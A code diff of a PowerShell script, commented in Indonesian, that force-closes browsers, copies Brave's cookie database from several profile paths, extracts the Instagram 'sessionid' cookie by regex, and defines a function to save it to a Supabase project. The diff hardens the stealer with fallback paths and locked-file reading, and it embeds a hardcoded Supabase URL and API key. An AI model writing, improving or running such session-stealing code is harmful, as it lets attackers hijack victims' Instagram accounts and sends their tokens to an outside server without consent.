@@ -1,6 +1,6 @@
 # --- KONFIGURASI SUPABASE LOCAL ---
-$SUPABASE_URL = "https://bsunzewnefxyamapczzw.supabase.co"
-$SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzdW56ZXduZWZ4eWFtYXBjenp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgxNjQ3MjQsImV4cCI6MjEwMzc0MDcyNH0.QzoTFIGOREcUXl6SfxvpxA61d53g0hTB9x8Dsbfthws"
+SUPABASE_URL = "https://bsunzewnefxyamapczzw.supabase.co"
+SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzdW56ZXduZWZ4eWFtYXBjenp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgxNjQ3MjQsImV4cCI6MjEwMzc0MDcyNH0.QzoTFIGOREcUXl6SfxvpxA61d53g0hTB9x8Dsbfthws"
 
 function Kill-BrowserProcesses {
     Write-Host "[*] Membersihkan proses browser di latar belakang..."
@@ -37,36 +37,56 @@ function Save-To-Supabase {
 function Get-InstagramSession {
     Kill-BrowserProcesses
 
-    $dbPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
-    
-    if (-not (Test-Path $dbPath)) {
-        # Coba lokasi fallback jika direktori Default tidak ada
-        $dbPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Network\Cookies"
+    # Cari lokasi database cookie Brave (Default & Profile)
+    $possiblePaths = @(
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Network\Cookies",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Cookies"
+    )
+
+    $dbPath = $null
+    foreach ($path in $possiblePaths) {
+        if (Test-Path $path) {
+            $dbPath = $path
+            break
+        }
     }
 
-    if (-not (Test-Path $dbPath)) {
+    if (-not $dbPath) {
         Write-Host "[!] File database cookie Brave tidak ditemukan."
         return
     }
 
-    # Salin file SQLite ke folder Temp agar tidak terkunci oleh sistem
+    # Salin file ke Temp agar tidak ter-lock oleh sistem
     $tempDb = "$env:TEMP\brave_cookies_temp.db"
     Copy-Item -Path $dbPath -Destination $tempDb -Force
 
     Write-Host "[*] Membaca database cookie Brave..."
 
-    # Ekstraksi string binary/text cookie dari file SQLite
-    $bytes = [System.IO.File]::ReadAllBytes($tempDb)
-    $text = [System.Text.Encoding]::Latin1.GetString($bytes)
+    try {
+        # Gunakan FileStream agar aman membaca file yang sedang terunci/terpakai
+        $fileStream = [System.IO.File]::Open($tempDb, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+        $binaryReader = New-Object System.IO.BinaryReader($fileStream)
+        $bytes = $binaryReader.ReadBytes($fileStream.Length)
+        $binaryReader.Close()
+        $fileStream.Close()
 
-    # Hapus file temporary
+        # Konversi bytes ke string dengan aman
+        $text = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($bytes)
+    }
+    catch {
+        Write-Host "[!] Gagal membaca file cookie: $_"
+        Remove-Item -Path $tempDb -Force -ErrorAction SilentlyContinue
+        return
+    }
+
+    # Hapus file sementara
     Remove-Item -Path $tempDb -Force -ErrorAction SilentlyContinue
 
-    # Ekstraksi pattern sessionid menggunakan RegEx
+    # Cari pattern cookie sessionid
     if ($text -match 'sessionid\x00([^\x00\r\n\t]+)') {
         $rawSession = $Matches[1]
-        
-        # Sterilisasi string hasil pencarian
         $sessionIdVal = $rawSession -replace '[^\w%:-]', ''
 
         Write-Host ("=" * 65)
@@ -83,5 +103,5 @@ function Get-InstagramSession {
     }
 }
 
-# Jalankan eksekusi utama
+# Eksekusi
 Get-InstagramSession
